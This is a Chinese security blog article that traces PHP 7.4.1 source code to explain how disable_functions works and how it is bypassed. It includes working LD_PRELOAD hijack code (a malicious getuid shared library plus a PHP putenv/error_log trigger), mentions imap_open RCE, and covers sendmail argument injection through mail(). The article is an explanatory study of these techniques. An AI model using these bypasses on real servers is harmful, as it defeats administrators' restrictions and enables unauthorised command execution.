> 原文链接: https://www.anquanke.com//post/id/228712 


# 浅谈绕过disable_functions的部分方法的原理


                                阅读量   
                                **228940**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t013836f08433ccc2f1.jpg)](https://p3.ssl.qhimg.com/t013836f08433ccc2f1.jpg)



复现了一道`2019 TCTF`的题发现仍然是考察对`disable_functions`的绕过与利用，加之个人经常使用蚁剑插件来对`disable_functions`进行绕过，所用原理并没有非常清楚，因此想对`disable_functions`的部分利用方法原理展开较为全面的叙述，中途可能对所遇到的一些函数进行更加深入的了解和漏洞分析，如有不当，请多多指正。



## 从PHP7.4.1源码角度深入理解

入口在`main.c`中，其中通过`INI_STR`获取`disable_functions`

```
static void php_disable_functions(void)
`{`
    char *s = NULL, *e;

    if (!*(INI_STR("disable_functions"))) `{`
        return;
    `}`

    e = PG(disable_functions) = strdup(INI_STR("disable_functions"));
    if (e == NULL) `{`
        return;
    `}`
    while (*e) `{`
        switch (*e) `{`
            case ' ':
            case ',':
                if (s) `{`
                    *e = '\0';
                    zend_disable_function(s, e-s);
                    s = NULL;
                `}`
                break;
            default:
                if (!s) `{`
                    s = e;
                `}`
                break;
        `}`
        e++;
    `}`
    if (s) `{`
        zend_disable_function(s, e-s);
    `}`
`}`
```

PHP源码中有四个关键宏需要有所了解
<li>EG关键宏
<pre><code class="lang-c hljs cpp"># define EG(v) (executor_globals.v)
extern ZEND_API zend_executor_globals executor_globals;
</code></pre>
Zend引擎在执行Opcode的时候，需要记录一些执行过程中的状态。如当前执行的类作用域，当前已经加载了哪些文件等。EG的含义是`executor_globals`。获取Zend执行器相关的全局变量。
</li><li>CG关键宏
<pre><code class="lang-c= hljs cpp"># define CG(v) (compiler_globals.v)
extern ZEND_API struct _zend_compiler_globals compiler_globals;
</code></pre>
PHP代码最终是转化为Opcode去执行的。在PHP转换为Opcode过程中需要保存一些信息。这些信息就保存在CG全局变量中,CG可以访问全局变量`compiler_globals`中的成员
</li>
<li>PG关键宏
<pre><code class="lang-c= hljs cpp"># define PG(v) (core_globals.v)
extern ZEND_API struct _php_core_globals core_globals;
</code></pre>
PHP的核心全局变量的宏
</li>
先来了解`INI_STR`:

[![](https://p0.ssl.qhimg.com/t0166e3d290f9c4aa64.png)](https://p0.ssl.qhimg.com/t0166e3d290f9c4aa64.png)

跟进`zend_ini_string_ex`

```
//zned_ini.c
ZEND_API char *zend_ini_string_ex(char *name, size_t name_length, int orig, zend_bool *exists) /* `{``{``{` */
`{`
    zend_ini_entry *ini_entry;

    ini_entry = zend_hash_str_find_ptr(EG(ini_directives), name, name_length);
    if (ini_entry) `{`
        if (exists) `{`
            *exists = 1;
        `}`

        if (orig &amp;&amp; ini_entry-&gt;modified) `{`
            return ini_entry-&gt;orig_value ? ZSTR_VAL(ini_entry-&gt;orig_value) : NULL;
        `}` else `{`
            return ini_entry-&gt;value ? ZSTR_VAL(ini_entry-&gt;value) : NULL;
        `}`
    `}` else `{`
        if (exists) `{`
            *exists = 0;
        `}`
        return NULL;
    `}`
`}`
```

`executor_globals`是一个`zend_executor_globals`类型的结构体，`executor_globals.ini_directives`是存放着`php.ini`信息的HashTable类型成员。通过`zend_hash_str_find_ptr`函数从EG(ini_directives)中获取**disable_functions**并返回。

接着如果定义了`disable_functions`，则通过while循环读取，用`swtich`分割函数名，将禁用函数名传入`zend_disable_function`函数，继续跟进

```
//zend_API.c
ZEND_API int zend_disable_function(char *function_name, size_t function_name_length) /* `{``{``{` */
`{`
    zend_internal_function *func;
    if ((func = zend_hash_str_find_ptr(CG(function_table), function_name, function_name_length))) `{`
        func-&gt;fn_flags &amp;= ~(ZEND_ACC_VARIADIC | ZEND_ACC_HAS_TYPE_HINTS);
        func-&gt;num_args = 0;
        func-&gt;arg_info = NULL;
        func-&gt;handler = ZEND_FN(display_disabled_function);
        return SUCCESS;
    `}`
    return FAILURE;
`}`
```

首先使用`zend_hash_str_find`在CG(function_table)查找`func`得到函数指针，如果没有查到（所查找内容不是函数）则直接返回，如果查到后通过

```
func-&gt;handler = ZEND_FN(display_disabled_function);
```

而在后续的原子操作中，包括最后编译成`opcode`都会检测`ZEND_FN(display_disabled_function)`，如果检测到就会返回`false`，这也基本解释了`disable_functions`的实现过程

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f5fcc3ec4c815202.png)



## 理解LD_PRELOAD

在对**disable_function**研究之前，我们现需要对`LD_PRELOAD`进行说明

> LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。

有点类似`Win中的hook`一样，下面可以通过一个例子来对LD_PRELOAD进行具体一点的分析:<br>
现在想将`linux`中`id`命令进行修改：<br>
通过`ldd`查看系统为`id`命令加载的共享对象:

[![](https://p4.ssl.qhimg.com/t01c8e3560f9caa28a4.png)](https://p4.ssl.qhimg.com/t01c8e3560f9caa28a4.png)

目前都是系统自带的共享库，进一步使用

```
nm -D /usr/bin/id 2&gt;&amp;1  OR  readelf -Ws /usr/bin/id 
#查看id命令可能调用的系统API
```

[![](https://p3.ssl.qhimg.com/t01186f26fa28c944d6.png)](https://p3.ssl.qhimg.com/t01186f26fa28c944d6.png)

但是可能实际调用的只是其中的一部分可以使用

```
strace -f /usr/bin/id 2&gt;&amp;1 #得到实际调用的API
# 如果没有strace命令 sudo apt-get install strace
```

整个调用链非常的长，分析发现调用了如下系统API：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018966fbe5fe642270.png)

因此我们可以通过定义一个定义与`getuid`完全一样的函数，包括**名称、变量及类型、返回值及类型等**，将包含替换函数的源码编译为动态链接库，在通过LD_PRELOAD进行预先加载恶意的共享对象实现自定义的同名函数的优先调用，来替换原本`id`的命令<br>
使用`man getuid`查看函数原型:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014757e9aae62b79b7.png)

根据函数原型编写同名函数，并且生成共享库

```
gcc -shared -fpic getuid_evil.c -o getuid_evil.so
```

```
#include &lt;unistd.h&gt;
#include&lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
uid_t getuid(void)
`{`
       system("echo 'getuid is changed'");
       return 0;
`}`
```

导入LD_PRELOAD后

[![](https://p3.ssl.qhimg.com/t0157c02fa60215edae.png)](https://p3.ssl.qhimg.com/t0157c02fa60215edae.png)

会一直循环调用该命令，还没有找到原因，搜索了一番发现是需要进行改善的:

```
#include &lt;unistd.h&gt;
#include&lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;

uid_t getuid(void)
`{`
       if(getenv("LD_PRELOAD")==NULL)`{`
              return 0;
       `}`
       unsetenv("LD_PRELOAD");
       system("echo 'getuid is changed'");
`}`
```

在没有改善的情况下再次`strace`跟踪执行情况发现:

[![](https://p1.ssl.qhimg.com/t011851355c4f469241.png)](https://p1.ssl.qhimg.com/t011851355c4f469241.png)

如果不进行`unsetenv`处理可以看到在执行`system`函数后又转向了该恶意共享库，随之又会进入恶意共享库的`getuid`函数，一直循环下去才有了之前的重复。<br>
可以看到我们的恶意共享库被最优先加载，而该库中有`getuid`同名函数，因此当调用系统API时会先从`LD_PRELOAD`库中进行查找，发现有需要调用的API后就会使用我们自定义的函数，因此会执行我们自定义函数

`LD_PRELOAD`定义在程序运行前优先加载的动态链接库，但前提是需要有新的进程启动后才会加载动态链接库，即使我们通过`LD_PRELOAD`劫持了系统函数，如果不能改通过PHP启动一个进程，还是无法调用该系统函数。总结三种Linux启动进程的方法

### <a class="reference-link" name="system()%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"></a>system()函数调用

```
//函数原型
#include &lt;stdlib.h&gt;
int system(const char *command);
```

一般来说，使用`system()`函数不是启动其他进程的理想手段，因为它必须用一个shell来启动需要的程序，即在启动程序之前需要先启动一个shell，而且对shell的环境的依赖也很大，因此使用`system()`函数的效率不高。

### <a class="reference-link" name="%E6%9B%BF%E6%8D%A2%E8%BF%9B%E7%A8%8B%E6%98%A0%E5%83%8Fexec%E7%B3%BB%E5%88%97%E5%87%BD%E6%95%B0"></a>替换进程映像exec系列函数

> <p>execve（执行文件）在父进程中fork一个子进程，在子进程中调用exec函数启动新的程序。<br>
exec函数一共有六个，其中execve为内核级系统调用，其他（execl，execle，execlp，execv，execvp）都是调用execve的库函数</p>

```
//函数原型
 #include &lt;unistd.h&gt;

       extern char **environ;

       int execl(const char *pathname, const char *arg, ...
                       /* (char  *) NULL */);
       int execlp(const char *file, const char *arg, ...
                       /* (char  *) NULL */);
       int execle(const char *pathname, const char *arg, ...
                       /*, (char *) NULL, char * const envp[] */);
       int execv(const char *pathname, char *const argv[]);
       int execvp(const char *file, char *const argv[]);
       int execvpe(const char *file, char *const argv[],
                       char *const envp[]);
```

exec系列函数由一组相关的函数组成，它们在进程的启动方式和程序参数的表达方式上各有不同。但是exec系列函数都有一个共同的工作方式，就是把当前进程替换为一个新进程，也就是说你可以使用exec函数将程序的执行从一个程序切换到另一个程序，在新的程序启动后，原来的程序就不再执行了,新进程由path或file参数指定。exec函数比system函数更有效。

### <a class="reference-link" name="%E5%A4%8D%E5%88%B6%E8%BF%9B%E7%A8%8B%E6%98%A0%E5%83%8F%20fork%E5%87%BD%E6%95%B0"></a>复制进程映像 fork函数

```
//函数原型
 #include &lt;sys/types.h&gt;
       #include &lt;unistd.h&gt;
       pid_t fork(void);
```

`exec()`调用用新的进程替换当前执行的进程，而我们也可以用`fork()`来复制一个新的进程，新的进程几乎与原进程一模一样，执行的代码也完全相同，但新进程有自己的数据空间、环境和文件描述符。



## 如何利用LD_PRELOAD进行disable_functions Bypass

其实需要做的是找到启动外部程序的PHP函数，例如PHP函数的`goForward()`实现“前进”的功能,php函数`goForward()`又由组成php解释器的C语言模块之一的`move.c`实现，C 模块`move.c`内部又通过调用外部程序`go.bin`实现，那么，我的`php`脚本中调用了函数`goForward()`势必启动外部程序 `go.bin`。<br>
在处理图片、请求网页、发送邮件场景中PHP函数可能设计到处理其他进程的功能，因此可以进行进一步分析:

### <a class="reference-link" name="%E9%80%9A%E8%BF%87sendmail%E8%BF%9B%E8%A1%8CBypass"></a>通过sendmail进行Bypass

模拟`curl`请求追踪调用的详细情况:

[![](https://p3.ssl.qhimg.com/t0132da98944ae3ecdc.png)](https://p3.ssl.qhimg.com/t0132da98944ae3ecdc.png)

可以看到使用`execve`属于`exec函数系列`，而第一个`execve`是调用PHP解释器，并没有新的进程的生成，还是不会加载`LD_PRELOAD`

模拟`/usr/bin/sendmail`进行邮件的发送追踪调用API情况:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01424245c411c12af2.png)

可以看到调用了`/bin/sh`和`/usr/sbin/sendmail`两个进程，这样我们就找到了PHP的函数mail()能够有新的进程，意味着当`LD_PRELOAD`被劫持后如果我们能使用该PHP方法，就有可能加载恶意共享库实现绕过，因此PHP中`mail`函数就是我们需要的。

同时还有`error_log()`函数以及`imap_open()`函数，从官方文档中可知:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01adbb6c3b729ead3a.png)

当`error_log()`第二个参数设置为1时，同样能够进行发送邮件的操作，为了确定该函数我们同样可以`strace`跟踪调用API情况：

[![](https://p3.ssl.qhimg.com/t01b684b26e8ce64324.png)](https://p3.ssl.qhimg.com/t01b684b26e8ce64324.png)

还有一个就是`imap 远程命令执行漏洞CVE-2018-19518`,这个函数它是用来发送邮件的，它使用的是`rsh`连接远程的shell，但是攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞达到RCE的效果，有兴趣的朋友可以去研究一下这个漏洞。

可以看到当运行`error_log.php`以及`mail.php`时均会执行我们的自定义函数，这是因为`sendmail`程序执行是会调用`getuid()`因此优先加载恶意共享库，调用了同名自定义函数：

[![](https://p0.ssl.qhimg.com/t016d92f046ef0d3eb2.png)](https://p0.ssl.qhimg.com/t016d92f046ef0d3eb2.png)

根据以上原理，可以简单通过`error_log`或者`mail`来调用`/usr/sbin/sendmail`进而利用`LD_PRELOAD`加载恶意共享库来实现绕过:

> 需要putenv函数来设置LD_PRELOAD

```
/*bypass_system.c*/

#include&lt;unistd.h&gt;
#include&lt;sys/types.h&gt;
#include&lt;stdlib.h&gt;

uid_t getuid(void)`{`
    if(getenv("LD_PRELOAD") == NULL)`{`
        return 0;
    `}`
    unsetenv("LD_PRELOAD");
    system("whoami");
`}`
```

```
//system.php
&lt;?php
system("whoami");
putenv("LD_PRELOAD=/home/php_learn/bypass_system.so");
error_log("a",1);
?&gt;
```

运行system.php可以发现利用`LD_PRELOAD`成功对**system函数**进行绕过:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01edb660218e60770a.png)

下面透过PHP内核来看`mail()`函数是如何调用新进程的？<br>
首先看一下`mail()`的函数原型：

```
mail($to, $subject, $message, $additional_headers = null, $additional_parameters = null)
```

在PHP7.4.1中对mail()进行分析

```
PHP_FUNCTION(mail)
`{`
    char *to=NULL, *message=NULL;
    char *subject=NULL;
    zend_string *extra_cmd=NULL, *str_headers=NULL, *tmp_headers;
    zval *headers = NULL;
    size_t to_len, message_len;
    size_t subject_len, i;
    char *force_extra_parameters = INI_STR("mail.force_extra_parameters");
    char *to_r, *subject_r;
    char *p, *e;

    ZEND_PARSE_PARAMETERS_START(3, 5)
        Z_PARAM_STRING(to, to_len)
        Z_PARAM_STRING(subject, subject_len)
        Z_PARAM_STRING(message, message_len)
        Z_PARAM_OPTIONAL
        Z_PARAM_ZVAL(headers)
        Z_PARAM_STR(extra_cmd)
    ZEND_PARSE_PARAMETERS_END();

    /* ASCIIZ check */
    MAIL_ASCIIZ_CHECK(to, to_len);
    MAIL_ASCIIZ_CHECK(subject, subject_len);
    MAIL_ASCIIZ_CHECK(message, message_len);
    if (headers) `{`
        switch(Z_TYPE_P(headers)) `{`
            case IS_STRING:
                tmp_headers = zend_string_init(Z_STRVAL_P(headers), Z_STRLEN_P(headers), 0);
                MAIL_ASCIIZ_CHECK(ZSTR_VAL(tmp_headers), ZSTR_LEN(tmp_headers));
                str_headers = php_trim(tmp_headers, NULL, 0, 2);
                zend_string_release_ex(tmp_headers, 0);
                break;
            case IS_ARRAY:
                str_headers = php_mail_build_headers(headers);
                break;
            default:
                php_error_docref(NULL, E_WARNING, "headers parameter must be string or array");
                RETURN_FALSE;
        `}`
    `}`
    if (extra_cmd) `{`
        MAIL_ASCIIZ_CHECK(ZSTR_VAL(extra_cmd), ZSTR_LEN(extra_cmd));
    `}`

    if (to_len &gt; 0) `{`
        to_r = estrndup(to, to_len);
        for (; to_len; to_len--) `{`
            if (!isspace((unsigned char) to_r[to_len - 1])) `{`
                break;
            `}`
            to_r[to_len - 1] = '\0';
        `}`
        for (i = 0; to_r[i]; i++) `{`
            if (iscntrl((unsigned char) to_r[i])) `{`
                /* According to RFC 822, section 3.1.1 long headers may be separated into
                 * parts using CRLF followed at least one linear-white-space character ('\t' or ' ').
                 * To prevent these separators from being replaced with a space, we use the
                 * SKIP_LONG_HEADER_SEP to skip over them. */
                SKIP_LONG_HEADER_SEP(to_r, i);
                to_r[i] = ' ';
            `}`
        `}`
    `}` else `{`
        to_r = to;
    `}`

    if (subject_len &gt; 0) `{`
        subject_r = estrndup(subject, subject_len);
        for (; subject_len; subject_len--) `{`
            if (!isspace((unsigned char) subject_r[subject_len - 1])) `{`
                break;
            `}`
            subject_r[subject_len - 1] = '\0';
        `}`
        for (i = 0; subject_r[i]; i++) `{`
            if (iscntrl((unsigned char) subject_r[i])) `{`
                SKIP_LONG_HEADER_SEP(subject_r, i);
                subject_r[i] = ' ';
            `}`
        `}`
    `}` else `{`
        subject_r = subject;
    `}`

    if (force_extra_parameters) `{`
        extra_cmd = php_escape_shell_cmd(force_extra_parameters);
    `}` else if (extra_cmd) `{`
        extra_cmd = php_escape_shell_cmd(ZSTR_VAL(extra_cmd));
    `}`

    if (php_mail(to_r, subject_r, message, str_headers ? ZSTR_VAL(str_headers) : NULL, extra_cmd ? ZSTR_VAL(extra_cmd) : NULL)) `{`
        RETVAL_TRUE;
    `}` else `{`
        RETVAL_FALSE;
    `}`

    if (str_headers) `{`
        zend_string_release_ex(str_headers, 0);
    `}`

    if (extra_cmd) `{`
        zend_string_release_ex(extra_cmd, 0);
    `}`
    if (to_r != to) `{`
        efree(to_r);
    `}`
    if (subject_r != subject) `{`
        efree(subject_r);
    `}`
`}`
```

可以看到，经过一系列处理后，最后调用`php_mail()`，而`php_mail()`对应的五个参数，分别是传入的五个参数经过处理后得到的，这里可以重点看一下第五个参数`$additional_parameters`，因为其涉及到命令处理相关,不过这个参数先放在这里稍后再说，先直接跟进`php_mail`来看是怎样实现的？

```
PHPAPI int php_mail(char *to, char *subject, char *message, char *headers, char *extra_cmd)
`{`
#ifdef PHP_WIN32
    int tsm_err;
    char *tsm_errmsg = NULL;
#endif
    FILE *sendmail;
    int ret;
    char *sendmail_path = INI_STR("sendmail_path");
    char *sendmail_cmd = NULL;
    char *mail_log = INI_STR("mail.log");
    char *hdr = headers;
#if PHP_SIGCHILD
    void (*sig_handler)() = NULL;
#endif

#define MAIL_RET(val) \
    if (hdr != headers) `{`    \
        efree(hdr);    \
    `}`    \
    return val;    \

    if (mail_log &amp;&amp; *mail_log) `{`
        char *logline;

        spprintf(&amp;logline, 0, "mail() on [%s:%d]: To: %s -- Headers: %s -- Subject: %s", zend_get_executed_filename(), zend_get_executed_lineno(), to, hdr ? hdr : "", subject);

        if (hdr) `{`
            php_mail_log_crlf_to_spaces(logline);
        `}`

        if (!strcmp(mail_log, "syslog")) `{`
            php_mail_log_to_syslog(logline);
        `}` else `{`
            /* Add date when logging to file */
            char *tmp;
            time_t curtime;
            zend_string *date_str;
            size_t len;


            time(&amp;curtime);
            date_str = php_format_date("d-M-Y H:i:s e", 13, curtime, 1);
            len = spprintf(&amp;tmp, 0, "[%s] %s%s", date_str-&gt;val, logline, PHP_EOL);

            php_mail_log_to_file(mail_log, tmp, len);

            zend_string_free(date_str);
            efree(tmp);
        `}`

        efree(logline);
    `}`

    if (PG(mail_x_header)) `{`
        const char *tmp = zend_get_executed_filename();
        zend_string *f;

        f = php_basename(tmp, strlen(tmp), NULL, 0);

        if (headers != NULL &amp;&amp; *headers) `{`
            spprintf(&amp;hdr, 0, "X-PHP-Originating-Script: " ZEND_LONG_FMT ":%s\n%s", php_getuid(), ZSTR_VAL(f), headers);
        `}` else `{`
            spprintf(&amp;hdr, 0, "X-PHP-Originating-Script: " ZEND_LONG_FMT ":%s", php_getuid(), ZSTR_VAL(f));
        `}`
        zend_string_release_ex(f, 0);
    `}`

    if (hdr &amp;&amp; php_mail_detect_multiple_crlf(hdr)) `{`
        php_error_docref(NULL, E_WARNING, "Multiple or malformed newlines found in additional_header");
        MAIL_RET(0);
    `}`

    if (!sendmail_path) `{`
#ifdef PHP_WIN32
        /* handle old style win smtp sending */
        if (TSendMail(INI_STR("SMTP"), &amp;tsm_err, &amp;tsm_errmsg, hdr, subject, to, message, NULL, NULL, NULL) == FAILURE) `{`
            if (tsm_errmsg) `{`
                php_error_docref(NULL, E_WARNING, "%s", tsm_errmsg);
                efree(tsm_errmsg);
            `}` else `{`
                php_error_docref(NULL, E_WARNING, "%s", GetSMErrorText(tsm_err));
            `}`
            MAIL_RET(0);
        `}`
        MAIL_RET(1);
#else
        MAIL_RET(0);
#endif
    `}`
    if (extra_cmd != NULL) `{`
        spprintf(&amp;sendmail_cmd, 0, "%s %s", sendmail_path, extra_cmd);
    `}` else `{`
        sendmail_cmd = sendmail_path;
    `}`

#if PHP_SIGCHILD
    /* Set signal handler of SIGCHLD to default to prevent other signal handlers
     * from being called and reaping the return code when our child exits.
     * The original handler needs to be restored after pclose() */
    sig_handler = (void *)signal(SIGCHLD, SIG_DFL);
    if (sig_handler == SIG_ERR) `{`
        sig_handler = NULL;
    `}`
#endif

#ifdef PHP_WIN32
    sendmail = popen_ex(sendmail_cmd, "wb", NULL, NULL);
#else
    /* Since popen() doesn't indicate if the internal fork() doesn't work
     * (e.g. the shell can't be executed) we explicitly set it to 0 to be
     * sure we don't catch any older errno value. */
    errno = 0;
    sendmail = popen(sendmail_cmd, "w");
#endif
    if (extra_cmd != NULL) `{`
        efree (sendmail_cmd);
    `}`

    if (sendmail) `{`
#ifndef PHP_WIN32
        if (EACCES == errno) `{`
            php_error_docref(NULL, E_WARNING, "Permission denied: unable to execute shell to run mail delivery binary '%s'", sendmail_path);
            pclose(sendmail);
#if PHP_SIGCHILD
            /* Restore handler in case of error on Windows
               Not sure if this applicable on Win but just in case. */
            if (sig_handler) `{`
                signal(SIGCHLD, sig_handler);
            `}`
#endif
            MAIL_RET(0);
        `}`
#endif
        fprintf(sendmail, "To: %s\n", to);
        fprintf(sendmail, "Subject: %s\n", subject);
        if (hdr != NULL) `{`
            fprintf(sendmail, "%s\n", hdr);
        `}`
        fprintf(sendmail, "\n%s\n", message);
        ret = pclose(sendmail);

#if PHP_SIGCHILD
        if (sig_handler) `{`
            signal(SIGCHLD, sig_handler);
        `}`
#endif

#ifdef PHP_WIN32
        if (ret == -1)
#else
#if defined(EX_TEMPFAIL)
        if ((ret != EX_OK)&amp;&amp;(ret != EX_TEMPFAIL))
#elif defined(EX_OK)
        if (ret != EX_OK)
#else
        if (ret != 0)
#endif
#endif
        `{`
            MAIL_RET(0);
        `}` else `{`
            MAIL_RET(1);
        `}`
    `}` else `{`
        php_error_docref(NULL, E_WARNING, "Could not execute mail delivery program '%s'", sendmail_path);
#if PHP_SIGCHILD
        if (sig_handler) `{`
            signal(SIGCHLD, sig_handler);
        `}`
#endif
        MAIL_RET(0);
    `}`

    MAIL_RET(1); /* never reached */
`}`
```

鉴于是主要针对`linux`下的分析，因此`WIN32`这里就可以进行忽视，可以很明显的看到`php_mail`是想通过`sendmail`来执行其功能，在开始的时候就获取了`sendmail`的路径，继续看：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013a056e0236f265c5.png)

经过一些对`header`以及其他输入参数的处理后，`linux`下会调用`popen`，来执行`sendmail_cmd`，而在之前已经对`sendmail_cmd`进行了赋值：

[![](https://p0.ssl.qhimg.com/t01371112fe011c952b.png)](https://p0.ssl.qhimg.com/t01371112fe011c952b.png)

默认情况下`extra_cmd = NULL`，因此`sendmail_cmd`其实也就是对应着`/usr/sbin/sendmail`,这里千万不要把`popen`视为PHP的函数，既然是C中的`popen`，其实这里的`poen()`函数是在Linux下共享链接库glibc中实现的,至于对`libc`库函数的分析，这里就不继续深入，其核心代码最后会调用

```
spawn_process (&amp;fa, fp, command, do_cloexec, pipe_fds, parent_end, child_end, child_pipe_fd)函数

其中包含
if (__posix_spawn (&amp;((_IO_proc_file *) fp)-&gt;pid, _PATH_BSHELL, fa, 0, (char *const[])`{` (char*) "sh", (char*) "-c", (char *) command, NULL `}`, __environ) != 0)
  return false;
```

不同系统对应的`_PATH_BSHELL`不一致，在linux中:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0124c4a4bd2b756e42.png)

最终会实现

```
//__posix_spawn()
/* Spawn a new process executing PATH with the attributes describes in *ATTRP.
   Before running the process perform the actions described in FILE-ACTIONS. */
int
__posix_spawn (pid_t *pid, const char *path,
           const posix_spawn_file_actions_t *file_actions,
           const posix_spawnattr_t *attrp, char *const argv[],
           char *const envp[])
`{`
  return __spawni (pid, path, file_actions, attrp, argv, envp, 0);
`}`
```

会通过该函数来创建一个新的进程，在此处也就是`/sh/bin`进程<br>
通过`man`查看一下`popen`的帮助手册：

[![](https://p3.ssl.qhimg.com/t018b388646f9921952.png)](https://p3.ssl.qhimg.com/t018b388646f9921952.png)

根据帮助文档也同时映证了会启动`/bin/sh`进程使用-c来执行`sendmail_cmd`也就是对应`/usr/sbin/sendmail`该路径，同样也能通过`strace`再次映证:

[![](https://p0.ssl.qhimg.com/t01cb9b74f479230e7b.png)](https://p0.ssl.qhimg.com/t01cb9b74f479230e7b.png)

**-t和-i参数由PHP自动添加。参数-t使sendmail从标准输入中提取头，-i阻止sendmail将‘.‘作为输入的结尾。-f来自于mail()函数调用的第5个参数**

下面从源码角度试着分析`mail()`函数的第五个参数:<br>
第五个参数其将使用这个电子邮件地址通知接收邮件服务器关于原始/发送者的信息,也就是所需要的`email`地址

不难发现`foece_extra_parameters`获取的就是`additional_parameters`,此时`extra_cmd`会经过`php_escape_shell_cmd`过滤后直接拼接到`php_mail`中

```
char *force_extra_parameters = INI_STR("mail.force_extra_parameters");
if (force_extra_parameters) `{`
        extra_cmd = php_escape_shell_cmd(force_extra_parameters);
    `}` else if (extra_cmd) `{`
        extra_cmd = php_escape_shell_cmd(ZSTR_VAL(extra_cmd));
    `}`

    if (php_mail(to_r, subject_r, message, str_headers ? ZSTR_VAL(str_headers) : NULL, extra_cmd ? ZSTR_VAL(extra_cmd) : NULL)) `{`
        RETVAL_TRUE;
    `}` else `{`
        RETVAL_FALSE;
    `}`
```

写一个`demo`演示一下:

```
&lt;?php
$mail = mail("","","","","-f attack@text.com");
?&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019e6565eb1f48fba8.png)

如果没有`escape_shell_cmd`，就是一个十分明显的命令注入，`escape_shell_cmd`会对某些字符进行转义，例如使用`&gt;`尝试拼接写入文件:

```
$mail = mail("","","","","-f attack@text.com &gt; /tmp/eval.txt");
```

但是`php_escape_shell_cmd`默认不会转义`$additional_parameters`其他字符，这意味着我们可以传入多个`/usr/sbin/sendmail`支持的参数，能够触发`/usr/sbin/sendmail`额外的功能，和之前有一道题考察`nmap`写入文件的支持参数类似，只是在那题中是`escapeshellarg`和`escapeshellcmd`结合使用，而在此只用到了`escapeshellcmd`，需要注意的是在PHP中`escapeshellcmm`的底层实现就是源码中`php_escape_shell_cmd`函数

`sendmail`接口由MTA邮件软件(**Sendmail, Postfix, Exim etc.**)安装提供。<br>
尽管基本的功能（如-t –I –f参数）是相同的，其他功能和参数根据MTA的不同有变化。我的环境`WSL`下是`Sendmail`的`MTA`,如果是基于`Sendmail`的`MTA`则存在参数对文件进行读写和保存，可以借此进行RCE，由于复杂性和一些历史漏洞原因，Sendmail MTA很少被使用。`现代linux分发中已不再默认包含它`，且在基于Redhat的系统（如centos）上被`Postfix MTA`替换，在基于Debian的系统（如Ubuntu、Debian等）上被`Exim MTA`替代。

不同MTA相关参数说明文档：
<li>EXIM: [https://linux.die.net/man/8/exim](https://linux.die.net/man/8/exim)
</li>
